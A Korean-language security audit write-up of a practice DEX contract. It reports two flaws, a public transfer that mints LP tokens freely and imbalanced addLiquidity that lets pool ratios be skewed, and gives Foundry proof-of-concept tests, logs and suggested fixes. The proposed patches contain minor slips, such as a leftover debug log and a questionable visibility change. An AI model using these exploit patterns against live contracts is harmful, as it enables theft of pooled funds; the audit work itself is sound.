# 김영운

## public transfer & mint LP token

****critical (공격 파급력: High, 공격 난이도: Low)****

```solidity
function transfer(address to, uint256 lpAmount) public override(ERC20, IDex) returns (bool) {
    _mint(to, lpAmount);
    return true;
}
```

ERC20 컨트랙트를 상속받은 Dex컨트랙트에서 LP token을 발급해주는 기능을 하는데, transfer함수를 public 가시성 지정자로 설정해 놨기 때문에 누구든 transfe함수를 호출하는 사람은 임의로 LP token을 발급받을 수 있다는 취약점이 존재한다.

#### PoC

```solidity
function testTransferVisibility() external {
    vm.startPrank(user1);
    dex.transfer(address(this), 1000 ether);
    uint amount = dex.balanceOf(address(this));
    console.log("balanceOf user1's LPtoken: %d", amount);
    amount = dex.totalSupply();
    console.log("amountOf LPtoken totalSupply: %d", amount);
    vm.stopPrank();
    assertTrue(!(amount == 1000 ether), "testTransferVisibility Error");
}
```

```solidity
[FAIL. Reason: Assertion failed.] testTransferVisibility() (gas: 72737)
Logs:
  balanceOf user1's LPtoken: 1000000000000000000000
  amountOf LPtoken totalSupply: 1000000000000000000000
  Error: testTransferVisibility Error
  Error: Assertion Failed
```

위와 같이 transfer함수를 호출함으로써 유동성 공급할 필요 없이 LP token을 mint할 수 있다.

#### 해결방안

transfer함수의 가시성 지정자를 private으로 변경하고 토큰을 민팅할 때도 _mint함수를 이용해서 minting하는 방법으로 바꿔야 한다.

## Imbalance addLiqudity 풀 오염

**medium (파급력: medium, 공격 난이도: Medium)**

```solidity
function addLiquidity(uint tokenXAmount, uint tokenYAmount, uint tokenMinimumOutputAmount) external override nonReentrant returns (uint) {
    require(tokenXAmount > 0 && tokenYAmount > 0, "Amounts must be greater than zero.");    
    require(tokenX.allowance(msg.sender, address(this)) >= tokenXAmount, "ERC20: insufficient allowance");
    require(tokenY.allowance(msg.sender, address(this)) >= tokenYAmount, "ERC20: insufficient allowance");
    require(tokenX.balanceOf(msg.sender) >= tokenXAmount, "ERC20: transfer amount exceeds balance");
    require(tokenY.balanceOf(msg.sender) >= tokenYAmount, "ERC20: transfer amount exceeds balance");
    
    uint lpTokenCreated;
    uint tokenXReserve;
    uint tokenYReserve;
    uint liquidityX;
    uint liquidityY;

    if (totalLiquidity == 0) {
        // 정밀도 
        lpTokenCreated = _sqrt(tokenXAmount * tokenYAmount); 
        require(lpTokenCreated >= tokenMinimumOutputAmount, "Minimum liquidity not met."); 
        totalLiquidity = lpTokenCreated;
    } else {
        {
            tokenXReserve = tokenX.balanceOf(address(this));
            tokenYReserve = tokenY.balanceOf(address(this));
        
            
            // L_x = X*P_x, L_y = Y*P_y (유동성 가치의 토큰 가치 비례) => P_x = L_x/X
            liquidityX = _div(_mul(tokenXAmount, totalLiquidity), tokenXReserve);
            liquidityY = _div(_mul(tokenYAmount, totalLiquidity), tokenYReserve);

        }
        // 최소 수량 유동성 공급 검증
        lpTokenCreated = (liquidityX < liquidityY) ? liquidityX : liquidityY;
        require(lpTokenCreated >= tokenMinimumOutputAmount, "Minimum liquidity not met."); 
        totalLiquidity += lpTokenCreated;
    }

    liquidity[msg.sender] += lpTokenCreated;
    tokenX.transferFrom(msg.sender, address(this), tokenXAmount);
    tokenY.transferFrom(msg.sender, address(this), tokenYAmount);

    transfer(msg.sender, lpTokenCreated);
    emit AddLiquidity(msg.sender, tokenXAmount, tokenYAmount);
    
    return lpTokenCreated;
}
```

최소 유동성을 기준으로 LP token을 발급해주는 방식으로 addLiquidity가 구현되어 잇는데, 이 때 imbalance한 공급을 주더라도 transferFrom으로 전부 받아오도록 되어 있다.

이를 이용한 공격 시나리오는 다음과 같다.

1. A는 100 ETH를 가지고 있고, ETH price = 4000 ether, USDC price = 1 ether인 상황
2. Lending protocol의 ETH-USDC 풀에 ETH조금과 USDC를 엄청 많이 addLiquidity한다.
3. 풀의 토큰 비율이 변경되었으므로 A는 변경된 비율로 ETH를 USDC로 swap한다.
4. 기존의 ETH로 얻을 수 있는 USDC의 양보다 많은 양의 USDC를 swap할 수 있게 된다.

#### PoC

```solidity
function testManyETH() external {
    dex.addLiquidity(4000000 ether, 1000 ether, 0);
    vm.startPrank(user1);
    uint lp = dex.addLiquidity(8000000 ether, 1 wei, 0);
    uint outputUSDC = dex.swap(0, 1000 ether, 0);
    console.log("outputUSDC: %d", outputUSDC);
    console.log("1000*4000: %d", 1000 * 4000 ether);
    vm.stopPrank();
}
```

```solidity
[PASS] testManyETH() (gas: 321793)
Logs:
  outputUSDC: 5996998499249624812403203
  1000*4000: 4000000000000000000000000
```

공격자는 해당 풀의 균형을 깨트려서 비싼 가격에 ETH를 swap했고, 슬리피지가 없는 스왑을 했다고 쳐도 그 이상의 이익을 볼 수 있다.

#### 해결방안

```solidity
function addLiquidity(uint tokenXAmount, uint tokenYAmount, uint tokenMinimumOutputAmount) external override nonReentrant returns (uint) {
    require(tokenXAmount > 0 && tokenYAmount > 0, "Amounts must be greater than zero.");    
    require(tokenX.allowance(msg.sender, address(this)) >= tokenXAmount, "ERC20: insufficient allowance");
    require(tokenY.allowance(msg.sender, address(this)) >= tokenYAmount, "ERC20: insufficient allowance");
    require(tokenX.balanceOf(msg.sender) >= tokenXAmount, "ERC20: transfer amount exceeds balance");
    require(tokenY.balanceOf(msg.sender) >= tokenYAmount, "ERC20: transfer amount exceeds balance");
    
    uint lpTokenCreated;
    uint tokenXReserve;
    uint tokenYReserve;
    uint liquidityX;
    uint liquidityY;

    if (totalLiquidity == 0) {
        // 정밀도 
        lpTokenCreated = _sqrt(tokenXAmount * tokenYAmount); 
        require(lpTokenCreated >= tokenMinimumOutputAmount, "Minimum liquidity not met."); 
        totalLiquidity = lpTokenCreated;
    } else {
        {
            tokenXReserve = tokenX.balanceOf(address(this));
            tokenYReserve = tokenY.balanceOf(address(this));
        
            
            // L_x = X*P_x, L_y = Y*P_y (유동성 가치의 토큰 가치 비례) => P_x = L_x/X
            liquidityX = _div(_mul(tokenXAmount, totalLiquidity), tokenXReserve);
            liquidityY = _div(_mul(tokenYAmount, totalLiquidity), tokenYReserve);

        }
        // 최소 수량 유동성 공급 검증
        lpTokenCreated = (liquidityX < liquidityY) ? liquidityX : liquidityY;
        if(lpTokenCreated == liquidityX){
            tokenYAmount = tokenYReserve * tokenXAmount / tokenXReserve;
        }else{
            tokenXAmount = (tokenXReserve * tokenYAmount) / tokenYReserve;
            console.log("!%d",tokenXAmount);
        }
        require(lpTokenCreated >= tokenMinimumOutputAmount, "Minimum liquidity not met."); 
        totalLiquidity += lpTokenCreated;
    }

    liquidity[msg.sender] += lpTokenCreated;
    tokenX.transferFrom(msg.sender, address(this), tokenXAmount);
    tokenY.transferFrom(msg.sender, address(this), tokenYAmount);

    transfer(msg.sender, lpTokenCreated);
    emit AddLiquidity(msg.sender, tokenXAmount, tokenYAmount);
    
    return lpTokenCreated;
}
```

```solidity
[PASS] testManyETH() (gas: 322673)
Logs:
  outputUSDC: 1998999499749874937469733
  100*4000: 400000000000000000000000
```

유동성 공급량이 적은 토큰을 기준으로 비율을 깨는 토큰은 받지 않도록 tokenAmount를 변경했다.

위 패치를 통해서 imbalance한 토큰으로 LP token을 얻는 방식의 공격도 막을 수 있게 된다.
